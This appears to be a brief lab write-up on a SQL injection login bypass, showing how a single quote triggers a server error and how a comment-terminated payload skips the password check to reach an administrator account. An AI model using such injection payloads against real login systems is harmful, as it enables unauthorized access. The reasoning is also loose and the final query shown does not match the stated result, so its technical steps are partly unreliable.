# SQL injection - login functionality

## end goal: perform SQL injection attack and log in as "administraitor" user

login to admin account:
`administraitor`

## analysis

``` SQL
 SELECT firstname FROM users where username='admin' and password='admin';
--and i get nothing but if i check random user and password like this:
 SELECT firstname FROM users where username='random_letters' and password='random_letters_and_numbers';
--i got an error "Invalid username or password." Then it has sql vunerability
let's try something like this
 SELECT firstname FROM users where username=''';
--now we get the backend server error. it 100% vunerable
 SELECT firstname FROM users where username='''--;
--i log in as administrator

```
